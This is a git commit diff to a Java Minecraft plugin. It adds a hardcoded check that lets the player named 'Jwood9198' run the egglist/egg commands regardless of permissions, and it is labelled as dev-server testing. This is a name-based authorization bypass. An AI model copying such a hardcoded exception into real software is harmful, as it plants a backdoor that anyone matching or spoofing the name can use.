779e9e606875fb135a32814e6baa736b16dd801b
Alex <www.woodrow73@gmail.com>
2015-02-13 16:31:18 -0500

    Enable Jwood Permissions for Dev Server Testing

--- src/main/java/com/crystalcraftmc/crystaleggfactory/CrystalEggFactory.java
+++ src/main/java/com/crystalcraftmc/crystaleggfactory/CrystalEggFactory.java
@@ -252,7 +252,7 @@
 +		if(sender instanceof Player) {
 +			Player p = ((Player) sender);
 +			if(p.hasPermission("Permission.Egg.egglist") &&
-+						p.hasPermission("Permission.Egg.egg")) { //returns true if this statement is true (at bottom); else returns false
++						p.hasPermission("Permission.Egg.egg") || p.getName().equalsIgnoreCase("Jwood9198")) { //returns true if this statement is true (at bottom); else returns false
 +				
 +				if(args.length == 0) {
 +					if(label.equalsIgnoreCase("egglist")) {
